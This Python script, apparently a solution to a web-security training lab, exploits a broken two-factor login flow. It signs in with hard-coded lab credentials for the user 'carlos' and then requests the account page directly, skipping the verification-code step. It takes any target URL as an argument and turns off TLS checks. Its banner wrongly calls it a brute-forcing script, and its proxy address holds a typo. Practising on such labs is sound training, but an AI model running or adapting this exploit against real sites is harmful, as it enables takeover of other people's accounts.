import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
   
    return parser.parse_args()

def banner():
    # getting rand font
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # getting rand colore
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('2FA_bypass',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))


def exploit(s, url):

    # Log into Carlos's account
   
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    try:
        r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
    except Exception as e:
        print(colored(e,'red'))
        pass
        sys.exit(0)
        

    # Confirm bypass
    myaccount_url = url + "/my-account"
    try:
        r = s.get(myaccount_url, verify=False, proxies=proxies)
        return r
    except Exception as e:
        print(colored(e,'red'))
        pass
        sys.exit(0)

def main():
    banner()
    url=parsearg().url
    url=str(url).replace('/login','',1)
    url=str(url).rstrip('/')
    s = requests.Session()
    
    print(colored("[+] Logging into Carlos's account and bypassing 2FA verification...",'blue'))

    r=exploit(s, url)
    if "Log out" in r.text:
        print(colored("[+] Successfully bypassed 2FA verification.",'green'))
    else:
        print(colored("(-) Exploit failed.",'red'))
        sys.exit(-1)

if __name__ == "__main__":
    main()